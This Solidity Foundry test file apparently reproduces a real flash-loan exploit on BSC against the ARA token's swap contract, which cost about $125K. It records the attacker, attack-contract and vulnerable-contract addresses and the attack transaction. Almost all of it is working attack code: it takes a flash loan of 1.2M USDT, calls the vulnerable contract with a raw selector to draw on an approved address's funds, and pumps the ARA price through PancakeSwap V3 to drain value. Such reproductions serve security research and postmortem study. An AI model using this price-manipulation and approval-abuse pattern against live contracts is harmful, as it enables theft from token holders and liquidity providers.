// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~125K USD$
// Attacker : https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366
// Attack Contract : https://bscscan.com/address/0x98e241bd3be918e0d927af81b430be00d86b04f9
// Vulnerable Contract : https://bscscan.com/address/0x7ba5dd9bb357afa2231446198c75bac17cefcda9
// Attack Tx : https://bscscan.com/tx/0xd87cdecd5320301bf9a985cc17f6944e7e7c1fbb471c80076ef2d031cc3023b2

// @Analysis
// https://twitter.com/BeosinAlert/status/1670638160550965248

interface IPancakeRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract ARATest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ARA = IERC20(0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e);
    IPancakeRouterV3 Router = IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IDPPOracle DPPOracle = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    address public constant exploitableSwapContract = 0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9;
    // Address param required for calling the exploitable contract
    address public constant approvedAddress = 0xB817Ef68d764F150b8d73A2ad7ce9269674538E0;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_214_010);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(ARA), "ARA");
        cheats.label(address(Router), "Router");
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(exploitableSwapContract, "Exploitable Contract");
        cheats.label(approvedAddress, "Approved Address");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        BUSDT.approve(address(Router), type(uint256).max);
        ARA.approve(address(Router), type(uint256).max);

        emit log_named_decimal_uint(
            "Attacker BUSDT balance before hack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
        // Step 1. Flashloan 1,202,701 USDT
        DPPOracle.flashLoan(0, 1_202_701 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker BUSDT balance after hack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // Step 2. Call the exploitable swap contract to swap 163,497 ARA -> 123,246 USDT
        callSwapContract(163_497 * 1e18, ARA);

        // Step 3. Use flashloaned 1,202,701 USDT -> 504,469 ARA to pull up the $ARA price.
        routerV3Swap(BUSDT, ARA, 1_202_701 * 1e18);
        emit log_named_decimal_uint(
            "Step 3. ARA amount out after first V3 swap", ARA.balanceOf(address(this)), ARA.decimals()
        );

        // Step 4. Call the swap contract again to swap 132,123 USDT -> 12,179 ARA to let the approved address take over $ARA at a high price.
        callSwapContract(132_123 * 1e18, BUSDT);

        // Step 5. Swap 504,469 ARA -> 1,327,617 USDT
        routerV3Swap(ARA, BUSDT, ARA.balanceOf(address(this)));
        emit log_named_decimal_uint(
            "Step 5. BUSDT amount out after second V3 swap", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );

        BUSDT.transfer(address(DPPOracle), quoteAmount);
    }

    function callSwapContract(uint256 amount, IERC20 token) internal {
        (bool success, bytes memory retData) = exploitableSwapContract.call(
            abi.encodeWithSelector(bytes4(0x135b43e9), amount, 0, address(token), approvedAddress)
        );
        require(success, "Swap not successful");
    }

    function routerV3Swap(IERC20 token1, IERC20 token2, uint256 amount) internal {
        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3.ExactInputSingleParams({
            tokenIn: address(token1),
            tokenOut: address(token2),
            fee: 100,
            recipient: address(this),
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }
}
